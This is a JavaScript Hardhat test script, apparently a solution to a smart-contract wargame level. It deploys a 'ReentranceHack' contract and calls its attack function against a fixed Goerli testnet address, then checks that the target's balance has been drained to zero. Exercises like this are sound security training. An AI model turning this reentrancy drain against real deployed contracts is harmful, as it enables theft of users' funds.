const { expect } = require("chai");
const { ethers } = require("hardhat");
const Web3 = require('web3');
const { api_key, } = require('../secrets.json');


describe("ReentrancyHack", function () {
    
    beforeEach(async function () {
        const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
        this.reentranceHack = await ReentranceHack.deploy();
        console.log(this.reentranceHack.address);
    });
    
    it("Attack", async function () {
        this.timeout(100000);
        const target_address = "0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb";
        
        // obtain current prize, it's on the 1st position of the storage        
        var web3 = new Web3(`wss://eth-goerli.g.alchemy.com/v2/${api_key}`);
        var balance = await web3.eth.getBalance(target_address);
        console.log(balance);
        
        // TODO: why do I need to use await/wait instead of plain await?
        const transaction = await this.reentranceHack.attack(target_address, {value: balance, gasLimit: 4000000});
        await transaction.wait();
  
        balance = await web3.eth.getBalance(target_address);
        console.log(balance);
        expect(balance).to.equal('0');
  });

  afterEach(async function() {
  });

});
